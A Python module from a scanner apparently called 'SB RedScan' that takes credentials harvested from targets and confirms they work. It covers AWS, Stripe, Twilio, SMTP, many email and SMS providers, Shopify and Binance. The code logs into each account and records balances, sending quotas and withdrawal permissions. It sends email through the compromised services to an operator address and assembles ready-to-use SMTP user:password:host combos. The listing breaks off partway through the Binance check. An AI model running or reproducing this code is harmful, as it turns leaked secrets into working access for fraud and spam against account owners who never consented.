"""
SB - Professional Security Scanner
Live credential validation — confirms found API keys are active.
No extra dependencies: uses stdlib hmac/hashlib for AWS Sig v4,
and requests (already a project dependency) for HTTP calls.
Authorized use only.
"""

import hashlib
import hmac
import ipaddress
import re
import socket
import datetime

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Red-team email for test sends — set once via set_redteam_email() at scan start
_REDTEAM_EMAIL: str = ''


def set_redteam_email(email: str) -> None:
    """Set the red-team email address used for test sends across all validators."""
    global _REDTEAM_EMAIL
    _REDTEAM_EMAIL = (email or '').strip()


# ── DB reachability check ────────────────────────────────────────────────────

DB_DEFAULT_PORTS = {
    'mysql':       3306,
    'mariadb':     3306,
    'pgsql':       5432,
    'postgres':    5432,
    'postgresql':  5432,
    'sqlsrv':      1433,
    'mssql':       1433,
    'mongodb':     27017,
    'redis':       6379,
    'oracle':      1521,
}


def validate_db_reachable(host: str, port, connection: str,
                          timeout: int = 6) -> dict | None:
    """
    Confirm an extracted DB host:port is actually reachable via TCP.
    This does NOT verify the password — just that the host exists and
    accepts connections on the DB port. Skips loopback / RFC1918 hosts
    (those would be probing our own network, not the target).
    """
    if not host:
        return None

    try:
        port_int = int(port) if port else DB_DEFAULT_PORTS.get(
            (connection or '').lower(), 0)
    except (TypeError, ValueError):
        port_int = DB_DEFAULT_PORTS.get((connection or '').lower(), 0)

    if not port_int:
        return None

    # Don't probe internal / private addresses — meaningless from our side
    try:
        ip = ipaddress.ip_address(host)
        if ip.is_loopback or ip.is_private or ip.is_link_local:
            return {
                'db_reachability': 'INTERNAL — host is private, not probed',
                'db_port_resolved': port_int,
            }
    except ValueError:
        pass  # hostname rather than IP — fall through to probe

    try:
        with socket.create_connection((host, port_int), timeout=timeout):
            return {
                'db_reachability':  f'REACHABLE — TCP {host}:{port_int} accepting',
                'db_port_resolved': port_int,
            }
    except (socket.timeout, OSError):
        return {
            'db_reachability':  f'UNREACHABLE — TCP {host}:{port_int} closed/filtered',
            'db_port_resolved': port_int,
        }


# ── Twilio validation ─────────────────────────────────────────────────────────

def validate_twilio(sid: str, token: str, timeout: int = 10) -> dict | None:
    """
    Test Twilio credentials by calling the Accounts API.
    Returns account info dict on success, None if invalid / unreachable.
    """
    if not sid or not token:
        return None
    url = f"https://api.twilio.com/2010-04-01/Accounts/{sid}.json"
    try:
        r = requests.get(url, auth=(sid, token), timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            result = {
                'validation':     'LIVE — credentials confirmed',
                'account_name':   d.get('friendly_name', ''),
                'account_status': d.get('status', ''),
                'account_type':   d.get('type', ''),
                'date_created':   d.get('date_created', ''),
            }
            # Fetch account balance / credit
            try:
                rb = requests.get(
                    f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Balance.json",
                    auth=(sid, token), timeout=timeout,
                )
                if rb.status_code == 200:
                    bd = rb.json()
                    result['balance']  = str(bd.get('balance', ''))
                    result['currency'] = bd.get('currency', '')
            except Exception:
                pass
            return result
        # 401 = bad creds, anything else = network/API issue
    except Exception:
        pass
    return None


# ── AWS helpers ───────────────────────────────────────────────────────────────

def _aws_sign(key: bytes, msg: str) -> bytes:
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()


def _aws_signing_key(secret: str, datestamp: str, region: str, service: str) -> bytes:
    k_date    = _aws_sign(('AWS4' + secret).encode('utf-8'), datestamp)
    k_region  = _aws_sign(k_date,    region)
    k_service = _aws_sign(k_region,  service)
    return      _aws_sign(k_service, 'aws4_request')


def _aws_ses_quota(access_key: str, secret_key: str,
                    region: str = 'us-east-1', timeout: int = 10) -> dict:
    """Query SES v1 GetSendQuota — returns sending quota/stats, or empty dict on failure."""
    service  = 'email'
    host     = f'email.{region}.amazonaws.com'
    qs       = 'Action=GetSendQuota&Version=2010-12-01'

    now       = datetime.datetime.now(datetime.timezone.utc)
    amzdate   = now.strftime('%Y%m%dT%H%M%SZ')
    datestamp = now.strftime('%Y%m%d')

    canon_hdrs  = f'host:{host}\nx-amz-date:{amzdate}\n'
    signed_hdrs = 'host;x-amz-date'
    phash       = hashlib.sha256(b'').hexdigest()
    canon_req   = '\n'.join(['GET', '/', qs, canon_hdrs, signed_hdrs, phash])

    cred_scope     = f'{datestamp}/{region}/{service}/aws4_request'
    sts_string     = '\n'.join([
        'AWS4-HMAC-SHA256', amzdate, cred_scope,
        hashlib.sha256(canon_req.encode()).hexdigest(),
    ])
    signing_key = _aws_signing_key(secret_key, datestamp, region, service)
    signature   = hmac.new(signing_key, sts_string.encode(), hashlib.sha256).hexdigest()

    auth = (
        f'AWS4-HMAC-SHA256 Credential={access_key}/{cred_scope}, '
        f'SignedHeaders={signed_hdrs}, Signature={signature}'
    )
    try:
        r = requests.get(
            f'https://{host}/?{qs}',
            headers={'X-Amz-Date': amzdate, 'Authorization': auth},
            timeout=timeout,
        )
        if r.status_code == 200:
            max24 = re.search(r'<Max24HourSend>([^<]+)</Max24HourSend>', r.text)
            rate  = re.search(r'<MaxSendRate>([^<]+)</MaxSendRate>',      r.text)
            sent  = re.search(r'<SentLast24Hours>([^<]+)</SentLast24Hours>', r.text)
            return {
                'ses_daily_limit':   max24.group(1) if max24 else 'unknown',
                'ses_sent_last_24h': sent.group(1)  if sent  else 'unknown',
                'ses_max_send_rate': rate.group(1)  if rate  else 'unknown',
            }
    except Exception:
        pass
    return {}


def validate_aws(access_key: str, secret_key: str,
                 region: str = 'us-east-1', timeout: int = 10) -> dict | None:
    """
    Test AWS credentials via STS GetCallerIdentity (always allowed by IAM).
    Returns account/identity info on success, None if invalid.
    """
    if not access_key or not secret_key:
        return None

    service  = 'sts'
    host     = 'sts.amazonaws.com'
    endpoint = 'https://sts.amazonaws.com'
    method   = 'POST'
    payload  = 'Action=GetCallerIdentity&Version=2011-06-15'
    ct       = 'application/x-www-form-urlencoded'

    now        = datetime.datetime.now(datetime.timezone.utc)
    amzdate    = now.strftime('%Y%m%dT%H%M%SZ')
    datestamp  = now.strftime('%Y%m%d')

    canonical_headers = (
        f'content-type:{ct}\n'
        f'host:{host}\n'
        f'x-amz-date:{amzdate}\n'
    )
    signed_headers  = 'content-type;host;x-amz-date'
    payload_hash    = hashlib.sha256(payload.encode('utf-8')).hexdigest()
    canonical_req   = '\n'.join([
        method, '/', '',
        canonical_headers, signed_headers, payload_hash,
    ])

    cred_scope     = f'{datestamp}/{region}/{service}/aws4_request'
    string_to_sign = '\n'.join([
        'AWS4-HMAC-SHA256', amzdate, cred_scope,
        hashlib.sha256(canonical_req.encode('utf-8')).hexdigest(),
    ])

    signing_key = _aws_signing_key(secret_key, datestamp, region, service)
    signature   = hmac.new(signing_key, string_to_sign.encode('utf-8'),
                           hashlib.sha256).hexdigest()

    authorization = (
        f'AWS4-HMAC-SHA256 Credential={access_key}/{cred_scope}, '
        f'SignedHeaders={signed_headers}, Signature={signature}'
    )

    headers = {
        'Content-Type': ct,
        'X-Amz-Date':   amzdate,
        'Authorization': authorization,
    }

    try:
        r = requests.post(endpoint, data=payload, headers=headers, timeout=timeout)
        if r.status_code == 200:
            account_id = re.search(r'<Account>(\d+)</Account>', r.text)
            user_id    = re.search(r'<UserId>([^<]+)</UserId>',  r.text)
            arn        = re.search(r'<Arn>([^<]+)</Arn>',        r.text)
            result = {
                'validation': 'LIVE — credentials confirmed',
                'account_id': account_id.group(1) if account_id else '',
                'user_id':    user_id.group(1)    if user_id    else '',
                'arn':        arn.group(1)         if arn        else '',
            }
            # Attach SES sending quota/stats
            ses = _aws_ses_quota(access_key, secret_key, region, timeout)
            if ses:
                result.update(ses)
            return result
    except Exception:
        pass
    return None


# ── Stripe validation ─────────────────────────────────────────────────────────

def validate_stripe(secret_key: str, timeout: int = 10) -> dict | None:
    if not secret_key:
        return None
    try:
        r = requests.get('https://api.stripe.com/v1/account',
                         auth=(secret_key, ''), timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            return {
                'validation':    'LIVE — credentials confirmed',
                'account_id':    d.get('id', ''),
                'business_name': d.get('business_profile', {}).get('name', ''),
                'email':         d.get('email', ''),
                'country':       d.get('country', ''),
            }
    except Exception:
        pass
    return None


# ── Plivo validation ──────────────────────────────────────────────────────────

def validate_plivo(auth_id: str, auth_token: str, timeout: int = 10) -> dict | None:
    if not auth_id or not auth_token:
        return None
    try:
        r = requests.get(f'https://api.plivo.com/v1/Account/{auth_id}/',
                         auth=(auth_id, auth_token), timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            return {
                'validation':   'LIVE — credentials confirmed',
                'account_id':   d.get('account_id', ''),
                'display_name': d.get('display_name', ''),
                'account_type': d.get('account_type', ''),
            }
    except Exception:
        pass
    return None


# ── Nexmo / Vonage validation ─────────────────────────────────────────────────

def validate_nexmo(api_key: str, api_secret: str, timeout: int = 10) -> dict | None:
    if not api_key or not api_secret:
        return None
    try:
        r = requests.get('https://rest.nexmo.com/account/get-balance',
                         params={'api_key': api_key, 'api_secret': api_secret},
                         timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            return {
                'validation':  'LIVE — credentials confirmed',
                'balance':     str(d.get('value', '')),
                'auto_reload': str(d.get('autoReload', '')),
            }
    except Exception:
        pass
    return None


# ── MessageBird validation ────────────────────────────────────────────────────

def validate_messagebird(access_key: str, timeout: int = 10) -> dict | None:
    if not access_key:
        return None
    try:
        r = requests.get('https://rest.messagebird.com/balance',
                         headers={'Authorization': f'AccessKey {access_key}'},
                         timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            return {
                'validation': 'LIVE — credentials confirmed',
                'amount':     str(d.get('amount', '')),
                'currency':   d.get('currency', ''),
                'payment':    d.get('payment', ''),
            }
    except Exception:
        pass
    return None


# ── Telnyx validation ─────────────────────────────────────────────────────────

def validate_telnyx(api_key: str, timeout: int = 10) -> dict | None:
    if not api_key:
        return None
    try:
        r = requests.get('https://api.telnyx.com/v2/balance',
                         headers={'Authorization': f'Bearer {api_key}'},
                         timeout=timeout)
        if r.status_code == 200:
            d = r.json().get('data', {})
            return {
                'validation':       'LIVE — credentials confirmed',
                'balance':          str(d.get('balance', '')),
                'available_credit': str(d.get('available_credit', '')),
                'currency':         d.get('currency_code', ''),
            }
    except Exception:
        pass
    return None


# ── Africa's Talking validation ───────────────────────────────────────────────

def validate_africas_talking(username: str, api_key: str, timeout: int = 10) -> dict | None:
    if not username or not api_key:
        return None
    try:
        r = requests.get(
            f'https://api.africastalking.com/version1/user?username={username}',
            headers={'apiKey': api_key, 'Accept': 'application/json'},
            timeout=timeout,
        )
        if r.status_code == 200:
            d = r.json().get('UserData', {})
            return {
                'validation': 'LIVE — credentials confirmed',
                'balance':    d.get('balance', ''),
            }
    except Exception:
        pass
    return None


# ── SendGrid validation ───────────────────────────────────────────────────────

def validate_sendgrid(api_key: str, timeout: int = 10) -> dict | None:
    if not api_key:
        return None
    try:
        r = requests.get('https://api.sendgrid.com/v3/user/profile',
                         headers={'Authorization': f'Bearer {api_key}'},
                         timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            result = {
                'validation': 'LIVE — credentials confirmed',
                'username':   d.get('username', ''),
                'email':      d.get('email', ''),
                'first_name': d.get('first_name', ''),
                'last_name':  d.get('last_name', ''),
            }
            _rt = _REDTEAM_EMAIL
            if _rt:
                from_email = d.get('email', _rt)
                result['test_sent'] = _sendgrid_send_test(api_key, from_email, _rt, timeout)
            return result
    except Exception:
        pass
    return None


# ── Postmark validation ───────────────────────────────────────────────────────

def validate_postmark(server_token: str, timeout: int = 10) -> dict | None:
    if not server_token:
        return None
    try:
        r = requests.get('https://api.postmarkapp.com/server',
                         headers={'X-Postmark-Server-Token': server_token,
                                  'Accept': 'application/json'},
                         timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            result = {
                'validation':  'LIVE — credentials confirmed',
                'server_name': d.get('Name', ''),
                'server_id':   str(d.get('ID', '')),
            }
            _rt = _REDTEAM_EMAIL
            if _rt:
                result['test_sent'] = _postmark_send_test(server_token, _rt, _rt, timeout)
            return result
    except Exception:
        pass
    return None


# ── Mailgun validation ────────────────────────────────────────────────────────

def validate_mailgun(api_key: str, domain: str = '', timeout: int = 10) -> dict | None:
    if not api_key:
        return None
    try:
        r = requests.get('https://api.mailgun.net/v3/domains',
                         auth=('api', api_key), timeout=timeout)
        if r.status_code == 200:
            d     = r.json()
            items = d.get('items', [])
            first_domain = items[0].get('name', '') if items else ''
            result = {
                'validation':   'LIVE — credentials confirmed',
                'total_count':  str(d.get('total_count', len(items))),
                'first_domain': first_domain,
            }
            _rt = _REDTEAM_EMAIL
            if _rt and first_domain:
                result['test_sent'] = _mailgun_send_test(api_key, first_domain, _rt, timeout)
            return result
    except Exception:
        pass
    return None


# ── Brevo (Sendinblue) validation ─────────────────────────────────────────────

def validate_brevo(api_key: str, timeout: int = 10) -> dict | None:
    if not api_key:
        return None
    try:
        r = requests.get('https://api.brevo.com/v3/account',
                         headers={'api-key': api_key, 'Accept': 'application/json'},
                         timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            result = {
                'validation': 'LIVE — credentials confirmed',
                'email':      d.get('email', ''),
                'first_name': d.get('firstName', ''),
                'last_name':  d.get('lastName', ''),
            }
            _rt = _REDTEAM_EMAIL
            if _rt:
                from_email = d.get('email', _rt)
                result['test_sent'] = _brevo_send_test(api_key, from_email, _rt, timeout)
            return result
    except Exception:
        pass
    return None


# ── Mandrill validation ───────────────────────────────────────────────────────

def validate_mandrill(api_key: str, timeout: int = 10) -> dict | None:
    if not api_key:
        return None
    try:
        r = requests.post('https://mandrillapp.com/api/1.0/users/info.json',
                          json={'key': api_key}, timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            result = {
                'validation':   'LIVE — credentials confirmed',
                'username':     d.get('username', ''),
                'reputation':   str(d.get('reputation', '')),
                'hourly_quota': str(d.get('hourly_quota', '')),
            }
            _rt = _REDTEAM_EMAIL
            if _rt:
                result['test_sent'] = _mandrill_send_test(api_key, _rt, timeout)
            return result
    except Exception:
        pass
    return None


# ── Mailjet validation ────────────────────────────────────────────────────────

def validate_mailjet(api_key: str, secret_key: str, timeout: int = 10) -> dict | None:
    if not api_key or not secret_key:
        return None
    try:
        r = requests.get('https://api.mailjet.com/v3/REST/sender',
                         auth=(api_key, secret_key), timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            result = {
                'validation':   'LIVE — credentials confirmed',
                'sender_count': str(d.get('Count', 0)),
            }
            _rt = _REDTEAM_EMAIL
            if _rt:
                result['test_sent'] = _mailjet_send_test(api_key, secret_key, _rt, timeout)
            return result
    except Exception:
        pass
    return None


# ── SparkPost validation ──────────────────────────────────────────────────────

def validate_sparkpost(api_key: str, timeout: int = 10) -> dict | None:
    if not api_key:
        return None
    try:
        r = requests.get('https://api.sparkpost.com/api/v1/account',
                         headers={'Authorization': api_key}, timeout=timeout)
        if r.status_code == 200:
            d = r.json().get('results', {})
            result = {
                'validation':   'LIVE — credentials confirmed',
                'company_name': d.get('company_name', ''),
                'plan':         d.get('subscription', {}).get('code', ''),
            }
            _rt = _REDTEAM_EMAIL
            if _rt:
                result['test_sent'] = _sparkpost_send_test(api_key, _rt, timeout)
            return result
    except Exception:
        pass
    return None


# ── ElasticEmail validation ───────────────────────────────────────────────────

def validate_elasticemail(api_key: str, timeout: int = 10) -> dict | None:
    if not api_key:
        return None
    try:
        r = requests.get(f'https://api.elasticemail.com/v2/account/load?apikey={api_key}',
                         timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            if d.get('success'):
                info = d.get('data', {})
                result = {
                    'validation': 'LIVE — credentials confirmed',
                    'email':      info.get('Email', ''),
                    'status':     str(info.get('StatusIndex', '')),
                }
                _rt = _REDTEAM_EMAIL
                if _rt:
                    result['test_sent'] = _elasticemail_send_test(api_key, _rt, timeout)
                return result
    except Exception:
        pass
    return None


# ── Sinch validation ──────────────────────────────────────────────────────────

def validate_sinch(service_plan_id: str, api_token: str, timeout: int = 10) -> dict | None:
    if not service_plan_id or not api_token:
        return None
    try:
        r = requests.get(
            f'https://sms.api.sinch.com/xms/v1/{service_plan_id}/batches',
            headers={'Authorization': f'Bearer {api_token}'},
            timeout=timeout,
        )
        if r.status_code == 200:
            return {
                'validation': 'LIVE — credentials confirmed',
                'plan_id':    service_plan_id,
            }
    except Exception:
        pass
    return None


# ── BulkSMS validation ────────────────────────────────────────────────────────

def validate_bulksms(username: str, password: str = None,
                     token: str = None, timeout: int = 10) -> dict | None:
    if not username and not token:
        return None
    try:
        auth = (token, '') if token else (username, password or '')
        r = requests.get('https://api.bulksms.com/v1/profile',
                         auth=auth, timeout=timeout)
        if r.status_code == 200:
            d = r.json()
            return {
                'validation': 'LIVE — credentials confirmed',
                'username':   d.get('username', ''),
                'quota':      str(d.get('quota', {}).get('remaining', '')),
            }
    except Exception:
        pass
    return None


# ── ClickSend validation ──────────────────────────────────────────────────────

def validate_clicksend(username: str, api_key: str, timeout: int = 10) -> dict | None:
    if not username or not api_key:
        return None
    try:
        r = requests.get('https://rest.clicksend.com/v3/account',
                         auth=(username, api_key), timeout=timeout)
        if r.status_code == 200:
            d = r.json().get('data', {})
            return {
                'validation': 'LIVE — credentials confirmed',
                'email':      d.get('email', ''),
                'balance':    str(d.get('balance', '')),
            }
    except Exception:
        pass
    return None


# ── SMTP test-send helpers ────────────────────────────────────────────────────

def _try_smtp_send(host: str, port: int, enc: str, username: str, password: str,
                    from_addr: str, to_addr: str, timeout: int = 10) -> str:
    """Attempt to send a test email using confirmed SMTP credentials. Returns status string."""
    import smtplib
    import email.mime.text as _mt
    try:
        msg = _mt.MIMEText(
            f'SB RedScan — SMTP credentials validated.\nHost: {host}:{port}\nUser: {username}',
            'plain',
        )
        msg['Subject'] = f'SB RedScan VALID — {host}'
        msg['From']    = from_addr
        msg['To']      = to_addr

        if enc == 'ssl':
            with smtplib.SMTP_SSL(host, port, timeout=timeout) as s:
                s.ehlo()
                s.login(username, password)
                s.sendmail(from_addr, to_addr, msg.as_string())
        else:
            with smtplib.SMTP(host, port, timeout=timeout) as s:
                s.ehlo()
                if enc == 'tls':
                    s.starttls()
                    s.ehlo()
                s.login(username, password)
                s.sendmail(from_addr, to_addr, msg.as_string())
        return f'YES — sent to {to_addr}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


def _mailgun_send_test(api_key: str, domain: str, redteam_email: str, timeout: int = 10) -> str:
    try:
        r = requests.post(
            f'https://api.mailgun.net/v3/{domain}/messages',
            auth=('api', api_key),
            data={
                'from':    f'RedScan <scanner@{domain}>',
                'to':      redteam_email,
                'subject': f'SB RedScan VALID — {domain}',
                'text':    f'Mailgun credentials validated for domain: {domain}',
            },
            timeout=timeout,
        )
        return f'YES — sent to {redteam_email}' if r.status_code in (200, 201) else f'NO — HTTP {r.status_code}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


def _sendgrid_send_test(api_key: str, from_email: str, redteam_email: str, timeout: int = 10) -> str:
    try:
        r = requests.post(
            'https://api.sendgrid.com/v3/mail/send',
            headers={'Authorization': f'Bearer {api_key}', 'Content-Type': 'application/json'},
            json={
                'personalizations': [{'to': [{'email': redteam_email}]}],
                'from':    {'email': from_email or redteam_email},
                'subject': 'SB RedScan VALID — SendGrid',
                'content': [{'type': 'text/plain', 'value': 'SendGrid credentials validated.'}],
            },
            timeout=timeout,
        )
        return f'YES — sent to {redteam_email}' if r.status_code == 202 else f'NO — HTTP {r.status_code}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


def _brevo_send_test(api_key: str, from_email: str, redteam_email: str, timeout: int = 10) -> str:
    try:
        r = requests.post(
            'https://api.brevo.com/v3/smtp/email',
            headers={'api-key': api_key, 'Content-Type': 'application/json'},
            json={
                'sender':      {'email': from_email or redteam_email, 'name': 'RedScan'},
                'to':          [{'email': redteam_email}],
                'subject':     'SB RedScan VALID — Brevo',
                'textContent': 'Brevo/Sendinblue credentials validated.',
            },
            timeout=timeout,
        )
        return f'YES — sent to {redteam_email}' if r.status_code == 201 else f'NO — HTTP {r.status_code}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


def _postmark_send_test(server_token: str, from_email: str, redteam_email: str, timeout: int = 10) -> str:
    try:
        r = requests.post(
            'https://api.postmarkapp.com/email',
            headers={'X-Postmark-Server-Token': server_token, 'Content-Type': 'application/json'},
            json={
                'From':     from_email or redteam_email,
                'To':       redteam_email,
                'Subject':  'SB RedScan VALID — Postmark',
                'TextBody': 'Postmark credentials validated.',
            },
            timeout=timeout,
        )
        return f'YES — sent to {redteam_email}' if r.status_code == 200 else f'NO — HTTP {r.status_code}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


def _mandrill_send_test(api_key: str, redteam_email: str, timeout: int = 10) -> str:
    try:
        r = requests.post(
            'https://mandrillapp.com/api/1.0/messages/send.json',
            json={
                'key': api_key,
                'message': {
                    'text':       'Mandrill credentials validated.',
                    'subject':    'SB RedScan VALID — Mandrill',
                    'from_email': redteam_email,
                    'to':         [{'email': redteam_email, 'type': 'to'}],
                },
            },
            timeout=timeout,
        )
        if r.status_code == 200:
            res = r.json()
            if isinstance(res, list) and res:
                st = res[0].get('status', '')
                return f'YES — sent ({st})' if st == 'sent' else f'NO — status: {st}'
        return f'NO — HTTP {r.status_code}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


def _mailjet_send_test(api_key: str, secret_key: str, redteam_email: str, timeout: int = 10) -> str:
    try:
        r = requests.post(
            'https://api.mailjet.com/v3.1/send',
            auth=(api_key, secret_key),
            json={
                'Messages': [{
                    'From':     {'Email': redteam_email, 'Name': 'RedScan'},
                    'To':       [{'Email': redteam_email}],
                    'Subject':  'SB RedScan VALID — Mailjet',
                    'TextPart': 'Mailjet credentials validated.',
                }],
            },
            timeout=timeout,
        )
        return f'YES — sent to {redteam_email}' if r.status_code == 200 else f'NO — HTTP {r.status_code}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


def _sparkpost_send_test(api_key: str, redteam_email: str, timeout: int = 10) -> str:
    try:
        r = requests.post(
            'https://api.sparkpost.com/api/v1/transmissions',
            headers={'Authorization': api_key, 'Content-Type': 'application/json'},
            json={
                'recipients': [{'address': redteam_email}],
                'content': {
                    'from':    redteam_email,
                    'subject': 'SB RedScan VALID — SparkPost',
                    'text':    'SparkPost credentials validated.',
                },
            },
            timeout=timeout,
        )
        return f'YES — sent to {redteam_email}' if r.status_code == 200 else f'NO — HTTP {r.status_code}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


def _elasticemail_send_test(api_key: str, redteam_email: str, timeout: int = 10) -> str:
    try:
        r = requests.post(
            'https://api.elasticemail.com/v2/email/send',
            data={
                'apikey':          api_key,
                'from':            redteam_email,
                'fromName':        'RedScan',
                'to':              redteam_email,
                'subject':         'SB RedScan VALID — ElasticEmail',
                'bodyText':        'ElasticEmail credentials validated.',
                'isTransactional': 'true',
            },
            timeout=timeout,
        )
        if r.status_code == 200:
            d = r.json()
            return f'YES — sent to {redteam_email}' if d.get('success') else f'NO — {d.get("error", "failed")}'
        return f'NO — HTTP {r.status_code}'
    except Exception as e:
        return f'NO — {type(e).__name__}: {str(e)[:80]}'


# ── SMTP / Mail validation ────────────────────────────────────────────────────

def validate_smtp(host: str, port: int, username: str, password: str,
                  timeout: int = 10, encryption: str = '',
                  from_addr: str = '') -> dict | None:
    """
    Authenticate against MAIL_HOST:MAIL_PORT using extracted credentials.
    Honours the MAIL_ENCRYPTION value — no assumption about connection mode.
    Tries modes in order dictated by the env value, then falls back through
    the remaining modes so nothing is skipped.
    """
    import smtplib

    if not all([host, username, password]):
        return None
    if 'mailtrap.io' in host or host.startswith('**') or not host.strip():
        return None
    if username.startswith('**') or password.startswith('**'):
        return None

    enc = (encryption or '').lower().strip()

    # Categorise the provider so the result is labelled without guessing
    _PROVIDERS = (
        ('gmail.com',        'gmail'),
        ('googlemail.com',   'gmail'),
        ('office365.com',    'office365'),
        ('outlook.com',      'office365'),
        ('awsapps.com',      'amazon_ses'),
        ('amazonaws.com',    'amazon_ses'),
        ('sendgrid.net',     'sendgrid'),
        ('mailgun.org',      'mailgun'),
        ('emailsrvr.com',    'rackspace'),
        ('zoho.com',         'zoho'),
        ('mandrillapp.com',  'mandrill'),
        ('mailjet.com',      'mailjet'),
        ('sendinblue.com',   'brevo'),
        ('brevo.com',        'brevo'),
        ('ionos.com',        'ionos'),
        ('1and1.com',        'ionos'),
        ('smtp2go.com',      'smtp2go'),
        ('postmarkapp.com',  'postmark'),
    )
    category = next((cat for sig, cat in _PROVIDERS if sig in host.lower()), 'other')

    effective_from = from_addr or username

    def _ssl(p):
        try:
            with smtplib.SMTP_SSL(host, p, timeout=timeout) as s:
                s.ehlo()
                s.login(username, password)
                return ('ssl', p)
        except smtplib.SMTPAuthenticationError:
            return False
        except Exception:
            return None

    def _starttls(p):
        try:
            with smtplib.SMTP(host, p, timeout=timeout) as s:
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login(username, password)
                return ('tls', p)
        except smtplib.SMTPAuthenticationError:
            return False
        except Exception:
            return None

    def _plain(p):
        try:
            with smtplib.SMTP(host, p, timeout=timeout) as s:
                s.ehlo()
                s.login(username, password)
                return ('none', p)
        except smtplib.SMTPAuthenticationError:
            return False
        except Exception:
            return None

    # Honour the extracted MAIL_ENCRYPTION; fall through remaining modes so we
    # never skip a valid combination just because the env was wrong.
    if enc == 'ssl':
        sequence = [(_ssl, port), (_ssl, 465), (_starttls, 587), (_plain, 25)]
    elif enc in ('tls', 'starttls'):
        sequence = [(_starttls, port), (_starttls, 587), (_ssl, 465), (_plain, 25)]
    else:
        sequence = [
            (_starttls, port), (_starttls, 587),
            (_ssl, 465), (_ssl, port),
            (_plain, 25), (_plain, port),
        ]

    for fn, p in sequence:
        result = fn(p)
        if result is False:
            return None   # server confirmed bad credentials — stop trying
        if result:
            enc_used, port_used = result
            combo = f"{username}:{password}:{host}:{port_used}:{enc_used}:{effective_from}"
            out = {
                'validation':    'LIVE — SMTP credentials authenticated',
                'smtp_host':     host,
                'smtp_port':     str(port_used),
                'smtp_auth':     f"{enc_used.upper()} on port {port_used}",
                'smtp_user':     username,
                'smtp_from':     effective_from,
                'smtp_category': category,
                'smtp_combo':    combo,
            }
            # Send a test email through the confirmed SMTP connection
            _rt = _REDTEAM_EMAIL
            if _rt:
                out['test_sent'] = _try_smtp_send(
                    host, port_used, enc_used, username, password,
                    effective_from, _rt, timeout,
                )
            return out
    return None


# ── Bandwidth validation ──────────────────────────────────────────────────────

def validate_bandwidth(account_id: str, api_token: str, api_secret: str,
                       timeout: int = 10) -> dict | None:
    if not account_id or not api_token or not api_secret:
        return None
    try:
        r = requests.get(
            f'https://dashboard.bandwidth.com/api/accounts/{account_id}/',
            auth=(api_token, api_secret), timeout=timeout,
        )
        if r.status_code in (200, 201):
            return {
                'validation':  'LIVE — credentials confirmed',
                'account_id':  account_id,
                'http_status': str(r.status_code),
            }
    except Exception:
        pass
    return None


# ── Telesign validation ───────────────────────────────────────────────────────

def validate_telesign(customer_id: str, api_key: str, timeout: int = 10) -> dict | None:
    if not customer_id or not api_key:
        return None
    try:
        r = requests.get(
            'https://rest-api.telesign.com/v1/phoneid/standard/15005550001',
            auth=(customer_id, api_key), timeout=timeout,
        )
        # 200/400/402 all mean the API accepted the credentials
        if r.status_code in (200, 400, 402):
            return {
                'validation':  'LIVE — credentials confirmed',
                'customer_id': customer_id,
                'http_status': str(r.status_code),
            }
    except Exception:
        pass
    return None


# ── Shopify validation ────────────────────────────────────────────────────────

def validate_shopify(access_token: str, shop_domain: str,
                     timeout: int = 10) -> dict | None:
    """
    Validate Shopify private-app or Admin API access token against the shop.
    Tries the Admin REST API /shop.json endpoint.
    """
    if not access_token or not shop_domain:
        return None
    shop = shop_domain.strip().rstrip('/')
    if not shop.endswith('.myshopify.com'):
        shop = f"{shop}.myshopify.com"
    try:
        r = requests.get(
            f"https://{shop}/admin/api/2024-01/shop.json",
            headers={'X-Shopify-Access-Token': access_token},
            timeout=timeout, verify=False,
        )
        if r.status_code == 200:
            d = r.json().get('shop', {})
            return {
                'validation':  'LIVE — credentials confirmed',
                'shop_name':   d.get('name', ''),
                'shop_domain': d.get('domain', shop),
                'plan':        d.get('plan_name', ''),
                'email':       d.get('email', ''),
            }
        elif r.status_code == 401:
            return {'validation': 'INVALID — access token rejected', 'validated': False}
    except Exception:
        pass
    return None


# ── Binance validation ────────────────────────────────────────────────────────

def validate_binance(api_key: str, api_secret: str, timeout: int = 10) -> dict | None:
    """
    Validate Binance API credentials by calling /api/v3/account (requires signature).
    Returns permissions, account type, and top non-zero asset balances.
    """
    import time as _time
    if not api_key or not api_secret:
        return None
    try:
        ts    = int(_time.time() * 1000)
        query = f'timestamp={ts}'
        sig   = hmac.new(
            api_secret.encode('utf-8'), query.encode('utf-8'), hashlib.sha256
        ).hexdigest()
        r = requests.get(
            f'https://api.binance.com/api/v3/account?{query}&signature={sig}',
            headers={'X-MBX-APIKEY': api_key},
            timeout=timeout, verify=False,
        )
        if r.status_code == 200:
            d = r.json()

            # Build human-readable permissions string
            perms = []
            if d.get('canTrade'):    perms.append('TRADE')
            if d.get('canWithdraw'): perms.append('WITHDRAW')
            if d.get('canDeposit'):  perms.append('DEPOSIT')
            perm_str = ' | '.join(perms) if perms else 'READ ONLY'

            # Top non-zero balances (up to 8 assets)
            non_zero = [
                f"{b['asset']}:{b['free']}"
                for b in d.get('balances', [])
                if float(b.get('free', 0)) > 0 or float(b.get('locked', 0)) > 0
            ]
            bal_str = ', '.join(non_zero[:8]) if non_zero else 'none'

            return {
                'validation':   'LIVE — credentials confirmed',
